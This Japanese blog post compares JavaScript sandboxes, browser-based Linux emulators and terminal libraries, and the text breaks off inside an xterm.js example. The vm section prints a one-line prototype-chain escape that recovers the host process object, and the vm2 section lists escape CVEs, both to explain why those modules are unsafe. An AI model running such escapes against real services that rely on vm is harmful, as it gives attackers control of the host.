---
title: JavaScriptによるLinuxカーネルシミュレーションソリューションの比較
description: JavaScript/TypeScriptによるLinux環境再現の詳細分析。
date: 2026-05-28authors:
  - fox3000foxy
tags:
  - javascript
  - linux
  - analysis
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEQcreZmmVx1U8zFHwsD+JTDIUKtMP5RYijaEkOIqZVfXIKA/i3h0lslw+ZgUBlLXKW3OVA2tGM8svcJWTXDxS8A=="
author_sig: "y7oiSiXEnIZ3P+LV0/6hA3zvxQzNQ7cToGmix7dVq+Z+OvDNAvOIwfQ9PxdgEK8cYmrXY/e0L2VGSbybho6npQ=="
---

# あらゆるJavaScriptサンドボックス、エミュレーター、シミュレーター、ハニーポット----比較

このウサギの穴にはもうずっと深くハマりすぎてたんだ。きっかけは[typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)を手伝ってたこと----Fortune（彼女については後で詳しく）のプロジェクトだ----で、「ちょっと待って、これって`v86`とどう違うの？」とか「なんで`vm2`じゃないの？」って何度も聞かれるようになって、まずエコシステム全体をマッピングしないとクリーンな答えが出せないって気づいたんだ。ってわけで、こんな感じになったよ lol。

で、4つの明確なファミリーがあることがわかった----JSサンドボックス、Linuxエミュレーター、Linuxシミュレーター、ハニーポット----で、同じ文脈でよく一緒に言及されるけど、ほとんど重なることはないんだ。プラグインシステムを作る人は`isolated-vm`を手に取る。CLIツールをデモする人は`v86`を手に取る。SSHの脅威インテルをやる人はCowrieを手に取る。全部「コードを箱の中で実行する」っていう曖昧な傘の下で、まったく別の問題を解決してるんだよね。

ソースコード、CVEレポート、アーキテクチャ文書、npmページを読むのにすごく時間をかけた。これは長くなるぞ----コーヒーを用意しろよ。まじで。2杯な。

> 簡単な免責：この記事では`typescript-virtual-container`が多く取り上げられている。なぜならこの調査の発端になったからだ。他のものについては公平に書くように努めたけど、そのコンテキストを頭に入れておいてほしい。

---

## パート0 -- そもそも、どの問題を解決したいのか？

深掘りする前に、各ファミリーが何のためのものかを正確に明確にしておく価値がある。なぜなら用語がすぐにいい加減になって、人々が常に混同しているからだ（俺自身も、ちゃんとマッピングするまではそうだった）。

**JSサンドボックス**は、JavaScriptコードをホストのNode.jsプロセスから分離する。脅威モデルは：信頼できないJSコードが`process.exit()`を呼んだり、ファイルを読んだり、子プロセスを生成したりする可能性があること。解決策はV8実行の境界だ。これらのツールはLinuxシェルやパーミッション付きファイルシステム、SSHといった概念を持たない。

**Linuxエミュレーター**は、JavaScriptまたはWebAssemblyで実装されたCPUエミュレーター（x86、RISC-V、OR1K）の中で、実際の未改変のLinuxカーネルを実行する。本物のOSが起動する。本物のシステムコールが得られる。x86コンパイル済みプログラムとのバイナリ互換性が得られる。オーバーヘッドは莫大だ。

**Linuxシミュレーター**は、実際のカーネルを実行せずにLinuxシステムの*振る舞い*を模倣する。シェルインタプリタ、仮想ファイルシステム、そしてプログラムや人間を騙すのに十分なUnixセマンティクスを実装する。カーネルなし。Wasmなし。CPUエミュレーションなし。はるかに低いオーバーヘッド。

**ハニーポット**は、攻撃者を引き寄せてその行動を記録するために作られている。主に実行環境ではなく、観測ツールだ。実際のLinux動作への忠実度は、攻撃者に罠を検知されない程度に保てれば十分だ。

という枠組みで、この記事の全プロジェクトがどこに位置づけられるか：

```
JSサンドボックス:    vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Linuxエミュレーター:  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Linuxシミュレーター:  typescript-virtual-container (この領域で唯一)
ハニーポット:         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
ターミナルスタック:    xterm.js + node-pty (分離機能ではないが、隣接)
```

---

## パート1 -- JavaScriptサンドボックス

### 1.1 `vm` -- Node.js組み込み（思ってるのとは違う）

Nodeで「信頼できないJSを実行する」一番古い答えは、組み込みの`vm`モジュールだ。v0.1からあるので、多くの人が最初に手を伸ばす----そして痛い目に遭う。

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

`vm`が実際にやっていること：新しいV8コンテキスト（新しいビルトインコンストラクター群----`Object`、`Array`、`Function`など）を作成し、`sandbox`に入れたものへの共有参照を持ってコードを実行する。V8エンジンは変わらない。プロセスは変わらない。メモリは共有される。

`vm`がセキュリティを提供しない理由：JavaScriptのプロトタイプチェーンは、すべてを`Object.prototype`に結びつけるDAGだ。ホストレルムから任意のオブジェクトをサンドボックスに入れると、ゲストはそのプロトタイプチェーンを遡ってホストコンストラクターに到達できる。`Function`から、`Function("return process")()` を呼び出して本物の`process`オブジェクトを取り戻せる。ゲームオーバー。即座に。

```js
// これはvmで普通に実行できる----本物のprocessオブジェクトが返る
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

つまり、Node.jsのドキュメント自体が言っている：「vmモジュールはセキュリティ機構ではありません。信頼できないコードの実行に使用しないでください。」この警告はずっと前からある。人々は常に無視している。本番アプリで`vm`をサンドボックスとして使ってるのを見たことがある。やめてくれ xD

**判定**: スコープ機構であって、サンドボックスではない。分離された変数スコープ（テンプレートエンジン、コードを制御できる`eval`的な機能）が必要なときに使え。信頼できない入力には絶対に使うな。

**メモリ**: 無視できるオーバーヘッド----ホストプロセスと同じV8ヒープ。  
**セキュリティ**: やる気のある攻撃者に対しては無。

---

### 1.2 `vm2` -- コミュニティの試み、そして非常に長い死

`vm2`は`vm`のエスケープ問題に対するコミュニティの答えだった。コアアイデア：サンドボックス境界を越えるすべてのオブジェクトを`Proxy`でラップし、プロパティアクセスをインターセプトし、プロトタイプクライミングをブロックし、危険な参照をフィルタリングする。理論上は賢いアイデア！実際はそうでもなかったけど。

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // VMErrorがスローされ、processにアクセス不可
```

数年はこれでまあまあ機能していた。しかしJavaScriptの`Proxy`の攻撃表面積は莫大だ。新しいJS言語機能----ジェネレーター、非同期イテレーター、`Symbol.toPrimitive`、`Error.prepareStackTrace`、`Promise`内部スロット----はすべて潜在的なバイパスベクターだ。

CVEのタイムラインは……ちょっとすごい。こんな感じ：

| 日付 | CVE | メカニズム |
|------|-----|-----------|
| Oct 2022 | CVE-2022-36067 | `Error.prepareStackTrace`によるホストコンテキストエスケープ |
| Apr 2023 | CVE-2023-29017 | 未処理の非同期エラースタックによるホストオブジェクトリーク |
| Apr 2023 | CVE-2023-29199 | `handleException()`による例外サニタイゼーションのバイパス |
| Apr 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| May 2023 | CVE-2023-32314 | `Error.name`上の`Proxy` → `Function` → RCE |
| Jul 2023 | CVE-2023-37466 | 非同期関数 + スタックオーバーフロー + `Proxy.getPrototypeOf` |
| Jul 2023 | CVE-2023-37903 | Workerスレッド + evalエスケープ |

同じ月（2023年4月）に3つの深刻なCVE。3つだ。1ヶ月で。CVE-2023-37903の後、メンテナーは公式にライブラリを非推奨とし、次のメッセージを残した：*「このライブラリには重大なセキュリティ問題が含まれており、本番環境で使用すべきではありません。」*

メンテナーは2025年10月にバージョン3.10.0で復活させ、当時知られているすべてを修正したと主張した。2026年1月に新たな重大なエスケープ（CVE-2026-22709、CVSS 9.8）が開示され、2026年5月にはさらに11件のCVEが続いた。11件だ。パターンは変わっていないし、正直変わらないと思う。

根本的な問題はアーキテクチャにある----そしてこれがエコシステム全体が学ぶのに時間がかかった教訓だ。サンドボックス化するのと同じ言語で、同じエンジンで、同じプロセスで、安全なサンドボックスを構築することはできない。エスケープ表面はV8実装全体だ----そしてV8は数百万行のC++で、変更され続けている。新しいJS機能が出るたびに、新しい攻撃経路が開く可能性がある。

**判定**: セキュリティ重視のアプリケーションには使用すべきでない。最新バージョンでも、数ヶ月ごとに新しいバイパスが発見されている。メンテナー自身もこれを公然と認めている。

---

### 1.3 `isolated-vm` -- 実際に機能するやつ

`isolated-vm`は正しいアプローチを取っている：V8自身の分離プリミティブ、Isolateを使う。各V8 Isolateは独自のヒープ、独自のガベージコレクター、独自のビルトインセットを持ち、他のIsolateとの共有参照はゼロだ。

これはChromeがタブ間で使っているのと同じ境界だ。言語レベルのProxyトリックではなく、本当のセキュリティ境界である。

```js
import ivm from "isolated-vm";

// 各Isolateは独自のV8ヒープ
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // MB制限
const context = await isolate.createContext();
const jail = context.global;

// 境界を越えるデータには明示的なシリアライズが必要
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // ホストプロセス、ホストヒープ、ホストモジュールには到達できない
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// タイムアウトやメモリ制限で強制終了できる
isolate.dispose(); // ヒープ全体を解放
```

`Reference`と`ExternalCopy`が明示的な通信ブリッジだ。`Reference`はIsolateにホスト関数への呼び出し可能なハンドルを与える----Isolateは呼び出せるが、そのクロージャやプロトタイプは検査できない。`ExternalCopy`は値をヒープ境界越えにシリアライズ（構造化クローン）する。この明示的ブリッジモデルは便利じゃないが、それが分離を現実のものにしている。

ハードリソース制限を設定できる：メモリ（上限超過でIsolateは終了される）、ウォールクロックタイムアウト、CPUタイムアウト。終了は本物だ----単なる`while(true)`でバイパスできるJSタイムアウトではなく、V8 Isolate全体を殺す。

**制限**: JSのみ。内部でbashは実行できない。ファイル、パーミッション、ネットワーク、プロセスの概念はない。ユーザー提出のJS（プラグイン、フォーミュラ、スクリプトフック）にはまさに適切なツールだが、それ以外には間違ったツールだ。`typescript-virtual-container`の作者は、初期にこれを検討したが、「シェルコマンドの実行」と「JavaScriptの分離」は根本的に異なる問題だと気づいたそうだ。

**メモリ**: 空のIsolateあたり~3–10 MB、ヒープ使用量に応じて増加。  
**セキュリティ**: 強力。V8 Isolate境界が本当の分離プリミティブ。  
**npm**: [isolated-vm](https://www.npmjs.com/package/isolated-vm)  
**GitHub**: [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten` -- Wasmにコンパイルされた別個のJSエンジン

別のアプローチ：V8内で分離する代わりに、完全に別個のJavaScriptエンジンをWebAssemblyにコンパイルして実行する。ホストはV8/Nodeで動作する。ゲストはQuickJS-in-Wasmで動作する。Wasmサンドボックスが分離境界を提供する。

QuickJSはFabrice Bellardの作品だ（QEMU、FFmpeg、JSLinux、TinyEMUの同じ人物----この人は本当に現実離れしてる、一人でどうやってこんなことやってるんだ）。Cで書かれた小さな仕様準拠のES2023 JSエンジンで、Wasmにコンパイルするとわずか~500 KBだ。

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // V8とは完全に別のQuickJSで実行される
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJSはCで書かれた小さな仕様準拠のES2023 JavaScriptエンジンだ。Wasmにコンパイルすると、同期バリアントで~500 KB、非同期（Asyncify）バリアントで~1 MB。メモリ管理は手動----VMから取り出した値はすべて明示的に破棄する必要がある。これはちょっと面倒だが、境界を越えたGCの驚きを防ぐ。面白いトレードオフだ！

`@sebastianwessel/quickjs`ラッパーは、より人間工学的なAPIを追加し、オプションの仮想ファイルシステム、fetchサポート、Node.jsモジュールスタブを提供する：

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

セキュリティモデルは`isolated-vm`とは異なる：Wasmの線形メモリモデルにより、ゲストはV8ヒープオブジェクトに直接アクセスできない。攻撃表面はホスト↔Wasmインターフェース（インポート/エクスポート）であり、JS言語全体ではない。これは一般的にProxyベースのサンドボクシングよりも堅牢だと考えられている。

欠点：QuickJSはV8と同じ最適化レベルを持っていない。CPUバウンドなJSワークロードでは、V8より5–20倍遅い。短いスニペットや信頼できないevalでは、通常これで問題にならない。

**メモリ**: インスタンスあたり~500 KBのWasmモジュール+ヒープ。  
**セキュリティ**: Wasm境界。Proxyベースのアプローチより堅牢とされる。  
**npm**: [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)  
**GitHub**: [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno -- パーミッション優先ランタイム

Denoはまったく異なる哲学を取っている：Node内でサンドボックス化する代わりに、デフォルトでセキュアな新しいランタイムを構築する。このアプローチは本当に気に入ってる----そもそもNode.jsが最初からこうあるべきだったんだよ、正直言って。Ryan Dahl（元Node.jsの作者）は文字通り、Node.jsの設計判断のいくつかを後悔してDenoを作ったんだ。考えてみると結構ワイルドだよね。

すべての機密機能（ファイル読み取り、ファイル書き込み、ネットワーク、env、サブプロセス）には明示的な`--allow-*`フラグが必要：

```bash
# これは/dataからの読み取りのみ可能
deno run --allow-read=/data script.ts

# これは1つのドメインにのみfetch可能
deno run --allow-net=api.example.com script.ts

# フラグなし = パーミッションなし
deno run untrusted.ts # 読み取り、書き込み、ネットワーク、生成、すべて不可
```

パーミッションモデルはRust/OSレベルで実装されている----JSのトリックではない。Denoコードが`Deno.readFile()`を呼び出すと、それはファイルシステムに触れる前にパーミッションテーブルをチェックするRustのopを通過する。パーミッションが付与されていなければシステムコールは発生しないので、JSからバイパスすることはできない。

本当に信頼できないコードを実行するために、Deno Workers（Web Workers）は同じプロセス内に第2のIsolateを提供し、それぞれが独自のパーミッションセットを持つ。ゼロパーミッションのWorkerを生成し、`postMessage`で通信できる。

Deno 2（2024年10月リリース）は完全なnpm互換性とNode.js互換性シムを追加し、サーバーサイドでの採用を大幅に改善した。

**トレードオフ**: Denoのセキュリティモデルは、部分的に信頼できるコードには優れている。完全に信頼できない敵対的なコードの場合、パーミッションモデルは役に立たない----Isolate境界（`isolated-vm`）か別のエンジン（`quickjs-emscripten`）が必要だ。なぜならDenoもV8を動かしており、高度な攻撃者はV8レベルのバグを見つけられるからだ。

---

### 1.6 TC39 ShadowRealm -- 標準的な答え（いずれは）

JavaScriptの標準化団体（TC39）はShadowRealmというプロポーザルを持っており、`vm`と`vm2`がやろうとしていたことを、正しいセキュリティモデルで標準化しようとしている。ShadowRealmは、独自のイントリンシクスを持ち、外部レルムへのアクセスがなく、慎重に制御されたインポート/エクスポートインターフェースを持つ、分離されたJS実行コンテキストを作成する。

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // 別個のイントリンシクス、外部レルムへのアクセスなし
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealmはブラウザ（Chrome 90+、Firefox 105+）にはあるが、2026年現在、Node.js安定版にはまだない。TC39 Compartmentsプロポーザルはその上にモジュールレベルの分離を構築する。これらは長期標準の答えだが、サーバーサイドのNodeユースケースではまだプロダクションレディではない。遠くから来るのが見えているのに、まだ……届いていない。古典的なTC39だ xD

---

### サンドボックスファミリーまとめ

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|---|
| **分離境界** | なし（スコープのみ） | Proxy（壊れてる） | V8 Isolate | Wasm | V8 Isolate + Rust権限 |
| **メモリ制限** | ❌ | ❌ | ✅ ハード制限 | ✅ Wasmヒープ | 部分的 |
| **CPUタイムアウト** | ❌ | ✅（バイパス可） | ✅ ハード | ✅ | ✅ |
| **セキュリティ** | なし | 壊れてる | 強力 | 強力 | 強力 |
| **JS速度** | ネイティブV8 | ネイティブV8 | ネイティブV8 | ~10倍遅い | ネイティブV8 |
| **ブラウザ** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Node互換** | ネイティブ | ✅ | ✅ | 部分的シム | 部分的 |
| **ステータス** | 安定 | リスクあり（新CVE） | ✅ 活発 | ✅ 活発 | ✅ 活発 |
| **RAMオーバーヘッド** | ~1 MB | ~5–20 MB | ~3–10 MB | ~5–15 MB | ~10–30 MB |

結論：セキュリティを気にするなら、本当の選択肢は正確に2つ----`isolated-vm`（ネイティブアドオン、V8 Isolate、フルJS速度）と`quickjs-emscripten`（Wasm、ブラウザ互換、計算負荷の高いコードで~10倍遅い）だ。それ以外は「やめてください」（`vm`、`vm2`）か、まったく別の問題を解決するランタイム（Deno）だ。ShadowRealmがいつかこの状況を変えるかもしれないが、まだそこには届いていない。

---

## パート2 -- JavaScriptのLinuxエミュレーター

ここからが本当に面白いところだ。これらは*本物の*エミュレーターで----JavaScriptまたはWebAssemblyでCPU命令セットを実装し、実際のLinuxカーネルイメージを起動し、本物のユーザーランドバイナリを実行する。分離は、ゲストとホストが何も共有しないことから来る：異なるメモリ空間、異なる命令ストリーム。

代償は莫大だが、得られるものは本当に注目に値する：実際のLinuxが、実際にブラウザやNodeプロセスの中で動作している。考えてみると結構ヤバくない？

### 2.1 `v86` -- JS + Wasm JITのx86 PCエミュレーター

GitHubのFabrice（copy）による`v86`は、JavaScriptで最も高性能なオープンソースx86エミュレーターだ。2013年頃にピュアJSインタプリタとして始まり、x86ベーシックブロックをオンザフライでWebAssemblyにトランスパイルするJITコンパイルシステムに進化し、パフォーマンスを劇的に向上させている。

エミュレートするもの：
- **CPU**: x86-32（IA-32）、命令セットはおおよそPentium 1レベル。64ビット（x86-64）は未対応----これはハードなアーキテクチャ制限であり、機能の欠落ではない。
- **FPU**: JavaScriptの`Float64Array`経由。x87は80ビット拡張精度だが、JSのdoubleは64ビット。つまり浮動小数点の結果が実際のCPUと微妙に異なる可能性がある。
- **メモリ**: 設定可能。JSヒープ内の`SharedArrayBuffer`または`ArrayBuffer`にマップされる。
- **ハードウェア**: 8254 PIT（タイマー）、8259 PIC（割り込みコントローラー）、8042キーボードコントローラー（PS/2）、CMOS RTC、SVGA拡張とBochs VBE付きVGA、IDEコントローラー、フロッピーコントローラー（8272A）、NE2000ネットワークカード。
- **BIOS**: SeaBIOS（オープンソースx86 BIOS）を使用。

JITはベーシックブロック（ジャンプのないx86命令のシーケンス）を識別し、WebAssembly関数に変換し、その関数をキャッシュし、同じブロックの後続の実行で呼び出す。ホットなコードパスはネイティブWasmのパフォーマンスを得る。コールドパスはJSインタプリタにフォールバックする。

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 MB
  autostart: true,
});

// シリアル出力（Linuxカーネルコンソール）をキャプチャ
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// ゲストに入力を送信（シェルにタイプ）
emulator.serial0_send("ls /\n");
```

**対応OS**: Alpine Linux（秀逸）、Ubuntu 16.04/18.04（i386のみ）、Arch Linux 32、ReactOS、FreeDOS、Windows 9x/2000（制限あり）、MS-DOS。

**起動時間**: クリーンイメージからのAlpine Linuxで15–40秒。これは本物のカーネル初期化に内在する----スキップできない。そう、ユーザーはブラウザでカーネル起動シーケンスを眺めることになる。それが取引だ xD

**メモリ下限**: インスタンスあたり100–256 MB。Wasm JITコードキャッシュだけでも、ビジーなLinuxインスタンスで数十MBに達する。

**Node.jsでの使用**: 完全対応。DOM不要----シリアルだけ気にするならVGA出力は破棄できる。

**できないこと**: 64ビットバイナリの実行、最新カーネル機能（eBPF、io_uringなど）の使用、メモリ制限に引っかからずに同時に数個以上のインスタンスを実行すること。

**npm**: [v86](https://www.npmjs.com/package/v86) -- 継続的に更新、執筆時点で最終公開は昨日。  
**GitHub**: [copy/v86](https://github.com/copy/v86)  
**デモ**: [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinuxとTinyEMU -- Bellardの作品、2度

JSLinuxはFabrice Bellard自身のJavaScript Linuxエミュレーター----最初のもので、2011年に公開された。この記事で何度もBellardの名前が出てくるのは、彼が次から次へと登場するからだ：QuickJS、TinyEMU、JSLinux、QEMU、FFmpeg。この男は別格だ。ソフトウェア史上、最も印象的な個人の技術的貢献の一つと言っても過言ではない。

オリジナルのJSLinuxは純粋なJSのx86インタプリタだった。2016年、BellardはTinyEMU（C言語のRISC-Vエミュレーター）を書き、Emscripten経由でJavaScriptにコンパイルし、それが現在のJSLinuxのベースになった。つまり現在のJSLinuxは、実際にはJavaScriptを生成するCコードであって、手書きのJSではない。

Bellardのサイトの技術ノートは読む価値がある：現在のJSLinuxは32または64ビットのRISC-V CPU（x86ではない）を実行し、VirtIOコンソール、VirtIOネットワーク、VirtIOブロックデバイス、ホストとのファイル共有用9Pファイルシステムをエミュレートする。JSデモはEmscriptenを使ってCからコンパイルされている----手書きのJSではない。

TinyEMU自体が対応するもの：
- RISC-V RV32IMAFDQC および RV64IMAFDQC（32および64ビット、浮動小数点、乗算、圧縮命令）
- KVM経由のx86（ネイティブのみ、エミュレーションなし----つまりJSバージョンはRISC-Vのみ）
- VirtIOコンソール、ネットワーク、ブロック、入力、9Pファイルシステム

TinyEMUにはEmscripten経由のJavaScriptデモが用意されている。JSLinuxのベースであり、`container2wasm`（セクション2.5参照）でも使われている。

**JSLinuxのステータス**: npmパッケージなし、プログラム可能なAPIなし。ブラウザで開くデモだ。歴史的意義は高い----概念を証明した。ライブラリとしての実用的な使用：なし。

**TinyEMU**: npmにはなし、Cソースは[bellard.org/tinyemu](https://bellard.org/tinyemu/)で入手可能。

---

### 2.3 jor1k -- OR1Kエミュレーター

jor1kはSebastian MackeによるJavaScriptで書かれたOpenRISC 1000（OR1K）エミュレーターだ。歴史的に興味深いのは、jor1kがVirtIO 9Pファイルシステムサポートを導入し、Bellardが後にTinyEMUとJSLinuxに取り入れたからだ。これらのプロジェクト間のクロス・ポリネーションは緊密で、互いに借用し合っている----これがオープンソースエミュレーション作品の最もクールな点の一つだ。

**ステータス**: もう積極的にはメンテナンスされていない。npmパッケージなし。現時点ではアーカイブされている。主に歴史的文脈のために知っておく価値がある----誰かが会話でjor1kを持ち出したら、何のことかわかるってわけだ :)

---

### 2.4 CheerpX -- ブラウザ向け商用x86エミュレーター

Leaning TechnologiesによるCheerpXは、商用のプロダクショングレードx86 Linuxエミュレーターだ。オープンソースではないが、実際のDebian/Ubuntuユーザーランドを動かすには`v86`より大幅に高性能だ。ブラウザで実際のVSCodeが必要なら、これを使う。

`v86`との主な違い：
- より広いISAに対応（より多くのx86拡張、より良いglibc互換性）
- ブラウザ内のIndexedDBベースのファイルシステム（ページリロード間で永続）
- `SharedArrayBuffer`によるpthreadサポート（COOP/COEPヘッダーが必要----そう、あの面倒なセキュリティヘッダー）
- VSCode、Python、Node.jsなどの実際のアプリケーションを実行するよう設計----最小限のOSイメージだけではない
- プロフェッショナルサポートとSLAあり（つまり壊れたら誰かを怒鳴れる）

典型的なユースケースは「サーバーなしでブラウザで実際のLinuxアプリケーションを実行する」。企業はブラウザベースのIDE、コーディングチュートリアル、インタラクティブなドキュメンテーションに使っている。

```js
// CheerpX API（簡略化）
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Node.jsの対応**: CheerpXはブラウザファースト。基礎となるエミュレーターは理論的にはNodeでも動くかもしれない（Wasmなので）が、APIとドキュメントは完全にブラウザ使用に向いている。サーバーサイドでの使用はサポートされていない。

**メモリ**: `v86`と同様----実際のDebianインスタンスで200+ MB。  
**価格**: オープンソースプロジェクトには無料、プロダクションSaaSには商用ライセンス。  
**ドキュメント**: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers（StackBlitz） -- Wasm内のNode.js、Linuxエミュレーションではない

WebContainersはよくLinuxエミュレーターと一緒くたにされるが、アーキテクチャは異なる。x86をエミュレートしない。Linuxを起動しない。WASIを使ってWebAssemblyにコンパイルされたNode.jsを実行する。この区別は重要で、俺自身もこれにずっと混乱してた lol。

混乱はマーケティングから来ていると思う----「ブラウザでNode.jsを実行する」と聞くとエミュレーションのように聞こえるが、実際はVM内でNode.jsを動かすLinuxエミュレーションではなく、Node.js自身がWasmにコンパイルされている。まったく別物だ。

アーキテクチャ：
1. Node.jsがWasmにコンパイルされる（具体的にはカスタムWASIランタイム）
2. Service WorkerがエミュレートされたNode.jsサーバーからのネットワークリクエストをインターセプトし、ブラウザタブにルーティングする
3. ファイルシステムはブラウザメモリ内に存在する（ディスクI/Oなし）
4. npmはブラウザ内使用に最適化されたカスタム実装

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// ファイルを書き込む
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Node.jsコマンドを実行
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

実際のNode.js（Wasmコンパイル済み）を実行するので、実際のnpm、実際のNode.js API、実際のモジュール解決が得られる。汎用Linuxユーザーランドは得られない----システムパッケージを`apt`でインストールしたり、任意のコンパイル済みバイナリを実行したり、Node.jsエコシステムの外で多くのことはできない。

**ブラウザ要件**: SharedArrayBuffer（COOP/COEPヘッダーが必要）、Service Worker対応、モダンWasm。

**Node.jsの対応**: ブラウザ専用に設計。ブラウザコンテキスト外ではAPIは機能しない。

**npm**: [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)  
**ドキュメント**: [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm -- WasmにコンパイルされたDockerコンテナ

`container2wasm`はNTTのツール（npmパッケージではない）で、DockerコンテナイメージをWebAssemblyバイナリに変換し、任意のWasmホスト（ブラウザを含む）で実行できるようにする。最初に見たときは本当に信じられなかった。

メカニズム：
- x86_64コンテナの場合：Bochs（Wasmにコンパイルされたx86エミュレーター）+ コンテナのルートファイルシステムを埋め込む
- riscv64コンテナの場合：TinyEMU（またBellardだ！）+ コンテナのルートファイルシステムを埋め込む
- 結果の`.wasm`ファイルがエミュレーターを起動し、コンテナファイルシステムをマウントし、コンテナのエントリーポイントを実行する

```bash
# Ubuntu 22.04コンテナをWasmに変換
c2w ubuntu:22.04 out.wasm

# 実行
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# ブラウザ用に提供
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

結果の`.wasm`は大きい----最小限のUbuntuでも数百MB----しかし完全に自己完結している。誰かに`.wasm`をメールで送って、ブラウザでUbuntuを実行してもらうことができる。その文は意味をなさないはずだが、現実だ。

**GitHub**: [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### エミュレーターファミリーまとめ

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **アーキテクチャ** | x86-32 JIT→Wasm | RISC-V（Wasm） | OR1K（JS） | x86（プロプライエタリ） | Node.js→Wasm/WASI | x86/RISC-V（Wasm） |
| **本物のカーネル** | ✅ | ✅ | ✅ | ✅ | ❌（Node.js） | ✅ |
| **64ビット** | ❌ | ✅（RISC-V） | ❌ | ✅ | n/a | ✅ |
| **npmパッケージ** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌（CLIツール） |
| **Node.js使用** | ✅ | ❌ | ❌ | ❌ | ❌（ブラウザのみ） | Wasmtime経由 |
| **ブラウザ使用** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/インスタンス** | 150–256 MB | ~64–128 MB | ~64 MB | 200+ MB | ~100 MB | ~200–500 MB |
| **起動時間** | 15–40秒 | 10–30秒 | 10–30秒 | 15–40秒 | 2–5秒 | 10–40秒 |
| **オープンソース** | ✅ | ✅ | ✅ | ❌ | 部分的 | ✅ |
| **ステータス** | ✅ 非常に活発 | ✅ 安定 | ⚠️ アーカイブ | ✅ 商用 | ✅ 活発 | ✅ 活発 |

この表から浮かび上がるのは：`v86`はnpmパッケージであり、ブラウザとNodeの両方で動作し、オープンソースである唯一のものだ。だから「JavaScript Linuxエミュレーター」の会話で支配的なんだ。他のものには何かしらの欠点がある----JSLinuxにはAPIがない、jor1kはアーカイブ、CheerpXは有料、WebContainersはブラウザ専用でNode固有、container2wasmはビルドステップとCLIが必要。「JavaScriptでLinuxを起動する」だけが必要なら、ほとんどいつも`v86`が適切な出発点だ。

---

## パート3 -- ターミナルスタック：xterm.jsとnode-pty

シェル的な体験を作るときに常に出てくる2つのパッケージ。サンドボックスでもエミュレーターでもない----UIとPTYの配管だ----でも非常に近接しているので、省くのは心が痛む。それに両方使ったことがあるけど、本当にいい出来だ。

### 3.1 `xterm.js` -- ターミナルレンダラー

xterm.jsはブラウザ用のターミナルエミュレーターだ。`<canvas>`要素でターミナル画面（VT100/xtermエスケープシーケンス）をレンダリングし、キーボード入力を処理し、データの入出力用APIを公開する。

使用先：VS Codeの統合ターミナル、Azure Cloud Shell、Proxmox VE、AWS CloudShellなど。

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// ターミナルにデータを送信（テキストとしてレンダリング）
term.write("$ ");
term.onData(data => {
  // dataはキーストローク----バックエンドに送信
  socket.send(data);
});
